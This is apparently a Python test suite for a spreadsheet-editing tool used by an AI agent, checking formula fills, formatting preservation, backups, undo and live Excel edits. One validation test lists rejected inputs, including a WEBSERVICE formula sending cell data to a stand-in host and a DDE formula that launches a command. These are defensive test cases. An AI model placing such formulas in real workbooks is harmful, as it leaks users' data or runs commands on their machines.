"""Spreadsheets: structure first, formulas not typing, preservation, and real Excel where it exists."""
import shutil
import sys
import tempfile
import threading
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import ocade_sheets  # noqa: E402
from conftest import live  # noqa: E402
from ocade_computer import Computer  # noqa: E402

ORDERS = [("North", "Laptop", 4, 950), ("South", "Monitor", 10, 180), ("East", "Laptop", 2, 950),
          ("West", "Keyboard", 25, 45), ("North", "Monitor", 6, 180), ("South", "Laptop", 1, 950)]
RATES = [("North", 0.08), ("South", 0.06), ("East", 0.07), ("West", 0.05)]


def workbook(path: Path) -> None:
    """A realistic book: orders to finish, a rates table to look up, and a sheet nobody asked to touch."""
    from openpyxl import Workbook
    from openpyxl.styles import Font
    book = Workbook()
    orders = book.active
    orders.title = "Orders"
    orders.append(["Region", "Product", "Units", "Unit price", "Revenue", "Tax"])
    for row in ORDERS:
        orders.append(list(row))
    rates = book.create_sheet("Rates")
    rates.append(["Region", "Rate"])
    for row in RATES:
        rates.append(list(row))
    notes = book.create_sheet("Notes")
    notes["A1"] = "Prepared by finance"
    notes["A1"].font = Font(bold=True, color="C00000")
    notes["B2"] = "=1+1"
    book.save(path)


# What a person would ask for, done with formulas and structure rather than typing results.
FINISH_ORDERS = [
    {"op": "fill", "range": "E2:E7", "formula": "=C2*D2"},
    {"op": "fill", "range": "F2:F7", "formula": "=E2*VLOOKUP(A2,Rates!$A$2:$B$5,2,FALSE)"},
    {"op": "set", "cell": "D8", "value": "Total"},
    {"op": "set", "cell": "E8", "value": "=SUM(E2:E7)"},
    {"op": "set", "cell": "F8", "value": "=SUM(F2:F7)"},
    {"op": "format", "range": "A1:F1", "bold": True, "fillColor": "#1F4E79", "fontColor": "#FFFFFF",
     "align": "center"},
    {"op": "format", "range": "D2:F8", "numberFormat": "$#,##0.00"},
    {"op": "format", "range": "A1:F8", "border": "thin"},
    {"op": "format", "range": "D8:F8", "bold": True},
    {"op": "conditional", "range": "E2:E7", "rule": "greater", "value": 2000, "fillColor": "#C6EFCE",
     "fontColor": "#006100"},
    {"op": "freeze", "cell": "A2"},
    {"op": "format", "range": "A1:F8", "columnWidth": "auto"},
]



class AutomationServerTest(unittest.TestCase):
    """The app that edits a file is found from the file type, never from a name (PLAN Section 0)."""

    def test_only_the_registered_openers_own_automation_server_counts(self):
        self.assertIsNone(ocade_sheets.automation_server(".ocade-no-such-type"))
        found = ocade_sheets.automation_server(".xlsx")
        if found:  # whatever app this computer registers for .xlsx, by its own registration
            self.assertTrue(found["progId"].endswith(".Application"), found)

class ValidationTest(unittest.TestCase):
    def test_refuses_what_is_unsafe_or_malformed(self):
        for ops in ([{"op": "set", "cell": "A1", "value": '=WEBSERVICE("https://x.test/?"&B1)'}],
                    [{"op": "set", "cell": "A1", "value": "=[Other.xlsx]Sheet1!A1"}],
                    [{"op": "fill", "range": "A1:A3", "formula": "=cmd|' /C calc'!A0"}],
                    [{"op": "set", "cell": "ZZZZ1", "value": 1}],
                    [{"op": "format", "range": "A1", "fillColor": "red"}],
                    [{"op": "drop_everything"}], []):
            with self.assertRaises(ocade_sheets.SheetError, msg=str(ops)):
                ocade_sheets.validate(ops)
        ocade_sheets.validate([{"op": "set", "cell": "A1", "value": '="WEBSERVICE( is just text"'}])

    def test_addresses_stay_inside_excels_grid(self):
        for address in ("A0", "XFE1", "A1048577", "ZZZ9999999"):
            with self.assertRaises(ocade_sheets.SheetError, msg=address):
                ocade_sheets.validate([{"op": "format", "range": address, "bold": True}])
        ocade_sheets.validate([{"op": "format", "range": "A:C", "bold": True},
                               {"op": "set", "cell": "XFD1048576", "value": 1}])

    def test_a_quoted_cell_name_is_words_not_a_reference(self):
        read = {"B1": {"formulas": [['=IF(A1="B1",1,0)']]}}
        self.assertEqual(ocade_sheets.problems(read), [])
        self.assertEqual(len(ocade_sheets.problems({"B1": {"formulas": [["=B1+1"]]}})), 1)


class FileEngineTest(unittest.TestCase):
    def setUp(self):
        self.root = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, self.root, True)
        self.book = self.root / "sales.xlsx"
        workbook(self.book)

    def test_two_quick_edits_keep_two_originals(self):
        undo = self.root / "undo"
        first = ocade_sheets.backup(self.book, undo)
        original = self.book.read_bytes()
        self.book.write_bytes(original + b"changed")
        second = ocade_sheets.backup(self.book, undo)  # the same second, the same name
        other = self.root / "elsewhere"
        other.mkdir()
        (other / "sales.xlsx").write_bytes(b"another folder's file")
        third = ocade_sheets.backup(other / "sales.xlsx", undo)
        self.assertEqual(len({first, second, third}), 3)
        self.assertEqual(first.read_bytes(), original)
        self.assertEqual(second.read_bytes(), original + b"changed")

    def test_formatting_changes_only_what_was_asked(self):
        from openpyxl import load_workbook
        from openpyxl.styles import Alignment, Font
        book = load_workbook(self.book)
        book["Orders"]["A1"].font = Font(underline="single", strike=True, vertAlign="superscript")
        book["Orders"]["A1"].alignment = Alignment(vertical="top", textRotation=30, indent=2, shrink_to_fit=True)
        book.save(self.book)
        out = ocade_sheets.edit(self.book, "Orders", [{"op": "format", "range": "A1", "bold": True,
                                                       "align": "center"}],
                                self.root / "undo", threading.Event(), engine="file")
        self.assertTrue(out["ok"], out)
        cell = load_workbook(self.book)["Orders"]["A1"]
        self.assertTrue(cell.font.bold)
        self.assertEqual(cell.alignment.horizontal, "center")
        self.assertEqual((cell.font.underline, cell.font.strike, cell.font.vertAlign),
                         ("single", True, "superscript"))
        self.assertEqual((cell.alignment.vertical, cell.alignment.textRotation, cell.alignment.indent,
                          cell.alignment.shrink_to_fit), ("top", 30, 2, True))

    def test_stop_before_saving_leaves_the_workbook_as_it_was(self):
        before = self.book.read_bytes()
        cancel = threading.Event()
        cancel.set()
        out = ocade_sheets.edit(self.book, "Orders", FINISH_ORDERS, self.root / "undo", cancel, engine="file")
        self.assertTrue(out["stopped"])
        self.assertEqual(self.book.read_bytes(), before)
        out = Computer(str(self.root)).run({"action": "sheet_edit", "path": "sales.xlsx", "overwrite": True,
                                            "ops": FINISH_ORDERS[:1]}, cancel=cancel)
        self.assertTrue(out["stopped"])
        self.assertEqual(self.book.read_bytes(), before)

    def test_a_failure_after_the_save_is_reported_as_a_change_with_undo(self):
        """P04: Excel saved, then its read-back threw; the job said only "failed"."""
        import unittest.mock

        def saved_then_failed(path, sheet, ops, cancel, close, server):
            path.write_bytes(b"changed by the job")
            return {"ok": False, "engine": "excel", "applied": ["set"], "error": "read-back failed"}

        before = self.book.read_bytes()
        pc = Computer(str(self.root))
        with unittest.mock.patch.object(ocade_sheets, "automation_server", return_value={"progId": "X.Application", "app": "X"}), \
                unittest.mock.patch.object(ocade_sheets, "edit_with_automation", saved_then_failed):
            out = pc.run({"action": "sheet_edit", "path": "sales.xlsx", "overwrite": True,
                          "ops": FINISH_ORDERS[:1]})
        self.assertEqual(out["status"], "failed")
        self.assertTrue(out["changed"], out)
        self.assertIn("was partly changed", out["summary"])
        self.assertEqual(pc.run({"action": "undo"})["status"], "done")
        self.assertEqual(self.book.read_bytes(), before)

    def test_a_failure_that_changed_nothing_says_so(self):
        import unittest.mock
        failed = {"ok": False, "engine": "excel", "applied": ["set"], "error": "Excel refused",
                  "unsavedEdits": True}
        with unittest.mock.patch.object(ocade_sheets, "automation_server", return_value={"progId": "X.Application", "app": "X"}), \
                unittest.mock.patch.object(ocade_sheets, "edit_with_automation", return_value=failed):
            out = Computer(str(self.root)).run({"action": "sheet_edit", "path": "sales.xlsx",
                                                "overwrite": True, "ops": FINISH_ORDERS[:1]})
        self.assertFalse(out["changed"])
        self.assertIn("was not changed", out["summary"])
        self.assertIn("close it without saving", out["summary"])

    def test_a_range_too_large_for_the_file_engine_is_refused(self):
        with self.assertRaisesRegex(ocade_sheets.SheetError, "too large"):
            ocade_sheets.edit(self.book, "Orders", [{"op": "format", "range": "A1:Z100000", "bold": True}],
                              self.root / "undo", threading.Event(), engine="file")

    def test_inspect_shows_structure_and_formulas(self):
        seen = ocade_sheets.inspect(self.book)
        self.assertEqual([s["name"] for s in seen["sheets"]], ["Orders", "Rates", "Notes"])
        self.assertEqual(seen["cells"][0][0], {"cell": "A1", "value": "Region"})
        notes = ocade_sheets.inspect(self.book, "Notes")
        self.assertEqual(notes["cells"][1][0]["formula"], "=1+1")

    def test_edits_with_formulas_and_preserves_the_rest(self):
        out = ocade_sheets.edit(self.book, "Orders", FINISH_ORDERS, self.root / "undo", threading.Event(),
                                engine="file")
        self.assertTrue(out["ok"], out)
        from openpyxl import load_workbook
        book = load_workbook(self.book)
        orders = book["Orders"]
        self.assertEqual(orders["E7"].value, "=C7*D7")  # filled relative, not typed
        self.assertEqual(orders["F3"].value, "=E3*VLOOKUP(A3,Rates!$A$2:$B$5,2,FALSE)")
        self.assertEqual(orders["E8"].value, "=SUM(E2:E7)")
        self.assertEqual(orders["D2"].number_format, "$#,##0.00")
        self.assertTrue(orders["A1"].font.bold)
        self.assertEqual(orders.freeze_panes, "A2")
        notes = book["Notes"]
        self.assertEqual(notes["A1"].value, "Prepared by finance")
        self.assertTrue(notes["A1"].font.bold)
        self.assertEqual(notes["B2"].value, "=1+1")
        self.assertEqual(len(list((self.root / "undo").iterdir())), 1)  # the original was kept

    def test_refuses_to_damage_what_it_cannot_keep(self):
        from openpyxl import load_workbook
        from openpyxl.chart import BarChart, Reference
        book = load_workbook(self.book)
        chart = BarChart()
        chart.add_data(Reference(book["Orders"], min_col=3, min_row=1, max_row=7), titles_from_data=True)
        book["Orders"].add_chart(chart, "H2")
        book.save(self.book)
        with self.assertRaises(ocade_sheets.SheetError):
            ocade_sheets.edit(self.book, "Orders", FINISH_ORDERS[:1], self.root / "undo", threading.Event(),
                              engine="file")

    def test_through_the_computer_stays_in_the_workspace(self):
        pc = Computer(str(self.root))
        self.assertEqual(pc.run({"action": "sheet_inspect", "path": "sales.xlsx"})["status"], "done")
        self.assertEqual(pc.run({"action": "sheet_inspect", "path": "../x.xlsx"})["status"], "blocked")
        self.assertEqual(pc.run({"action": "sheet_inspect", "path": "sales.xlsx",
                                 "sheet": "Missing"})["status"], "failed")


@live
@unittest.skipUnless(ocade_sheets.automation_server(".xlsx"), "needs an app that automates .xlsx")
class OriginalsAndChecksTest(unittest.TestCase):
    """Found on the preview: asked to keep the original, JARVIS edited it and then copied it, and
    its totals row summed itself (C6 = SUM(B6:E6)) while the read-back said only "0"."""

    def test_the_original_is_kept_and_the_copy_is_edited(self):
        root = Path(tempfile.mkdtemp())
        workbook(root / "sales.xlsx")
        before = (root / "sales.xlsx").read_bytes()
        pc = Computer(str(root))
        edit = {"action": "sheet_edit", "path": "sales.xlsx", "sheet": "Orders", "_close": True,
                "ops": [{"op": "set", "cell": "G1", "value": "Checked"}]}
        refused = pc.run(edit)
        self.assertEqual(refused["status"], "failed")
        self.assertIn("sales - completed.xlsx", refused["summary"])
        self.assertEqual((root / "sales.xlsx").read_bytes(), before)
        self.assertEqual(pc.run({"action": "file_copy", "path": "sales.xlsx", "to": "sales - completed.xlsx"})
                         ["status"], "done")
        self.assertEqual(pc.run({**edit, "path": "sales - completed.xlsx"})["status"], "done")
        self.assertEqual((root / "sales.xlsx").read_bytes(), before)
        # Asked to change the file itself, the person's word is enough.
        self.assertEqual(pc.run({**edit, "overwrite": True})["status"], "done")

    def test_a_formula_that_counts_itself_is_pointed_out(self):
        root = Path(tempfile.mkdtemp())
        workbook(root / "sales.xlsx")
        pc = Computer(str(root))
        out = pc.run({"action": "sheet_edit", "path": "sales.xlsx", "sheet": "Orders", "overwrite": True, "_close": True,
                      "ops": [{"op": "fill", "range": "C9:D9", "formula": "=SUM(B9:D9)"}]})
        self.assertEqual(out["status"], "done", out)
        self.assertIn("C9 refers to itself", out["summary"])
        self.assertEqual(len(out["problems"]), 2)


@live
class RealSpreadsheetAppTest(unittest.TestCase):
    """The acceptance task in the person's real Excel: visible, calculated, saved, reopened, verified."""

    def test_finish_the_orders_sheet_in_excel(self):
        root = Path(tempfile.mkdtemp())
        path = root / "sales.xlsx"
        workbook(path)
        out = ocade_sheets.edit(path, "Orders", FINISH_ORDERS, root / "undo", threading.Event(),
                                close=True)
        self.assertTrue(out["ok"], out)
        self.assertTrue(out["savedAndReopened"], "the saved file did not read back the same")
        revenue = [sum(u * p for _, _, u, p in ORDERS)]
        shown = out["read"]["E8"]["text"][0][0]
        self.assertEqual(shown, f"${revenue[0]:,.2f}")  # Excel's own calculation and number format
        rate = dict(RATES)
        tax = sum(u * p * rate[r] for r, _, u, p in ORDERS)
        self.assertEqual(out["read"]["F8"]["text"][0][0], f"${tax:,.2f}")
        self.assertEqual(out["read"]["E2:E7"]["formulas"][5][0], "=C7*D7")
        # Saved values are in the file itself, for any program that opens it next.
        from openpyxl import load_workbook
        values = load_workbook(path, data_only=True)
        self.assertAlmostEqual(values["Orders"]["F8"].value, tax, places=6)
        formulas = load_workbook(path)
        self.assertEqual(formulas["Notes"]["A1"].value, "Prepared by finance")
        self.assertTrue(formulas["Notes"]["A1"].font.bold)
        self.assertEqual(formulas["Orders"].conditional_formatting._cf_rules.__len__(), 1)


if __name__ == "__main__":
    unittest.main()
